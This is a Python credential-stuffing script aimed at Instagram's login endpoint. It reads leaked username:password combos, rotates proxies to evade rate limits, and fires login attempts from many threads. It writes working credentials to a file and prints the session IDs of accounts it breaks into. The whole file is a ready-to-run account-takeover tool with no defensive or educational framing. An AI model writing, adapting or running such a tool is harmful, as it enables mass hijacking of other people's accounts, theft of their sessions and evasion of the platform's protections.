import requests
from datetime import datetime
import threading
import random

loginpage_url = 'https://www.instagram.com/accounts/login/'
loginurl = 'https://www.instagram.com/accounts/login/ajax/'

proxy_list = [proxy.strip() for proxy in open("proxies.txt", "r", encoding="utf-8").readlines()]

class Queue:
    def __init__(self, combos):
        self.combos = combos
        self.index = 0
        self.lock = threading.Lock()

    def get_next_combo(self):
        with self.lock:
            if self.index < len(self.combos):
                combo = self.combos[self.index]
                self.index += 1
                return combo
            return None

def worker(combo_queue, lock):
    while True:
        combo = combo_queue.get_next_combo()
        if combo is None:
            break 

        try:
            username, password = combo.strip().split(':')
        except ValueError:
            print(f"Invalid combo format: {combo.strip()}")
            continue  

        proxy = random.choice(proxy_list)
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }

        try:
            response = requests.get(loginpage_url, proxies=proxies, timeout=10)
            csrf_token = response.cookies.get('csrftoken')

            time_stamp = int(datetime.now().timestamp())
            payload = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time_stamp}:{password}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }

            login_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": loginpage_url,
                "x-csrftoken": csrf_token
            }

            login_response = requests.post(loginurl, data=payload, headers=login_headers, proxies=proxies, timeout=10)
            json_data = login_response.json()

            if json_data.get("authenticated"):
                print(f"Login successful for {username}")
                cookies = login_response.cookies
                cookie_jar = cookies.get_dict()
                csrf_token = cookie_jar.get('csrftoken')
                session_id = cookie_jar.get('sessionid')
                with lock:
                    with open('working.txt', 'a', encoding="utf-8") as working_file:
                        working_file.write(f"{username}:{password}\n")
                print(f"Username: {username} | csrf_token: {csrf_token} | session_id: {session_id}")
            else:
                print(f"Login failed for {username}: {json_data}")
        except requests.exceptions.RequestException as e:
            print(f"Network error with {username}: {e}")
        except Exception as e:
            print(f"Error processing {username}: {e}")

def main():
    num_threads = int(input("Kaç thread çalıştırmak istiyorsunuz? "))

    with open('combo.txt', 'r', encoding="utf-8") as file:
        combos = file.readlines()

    queue = Queue(combos)
    lock = threading.Lock()

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, lock))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
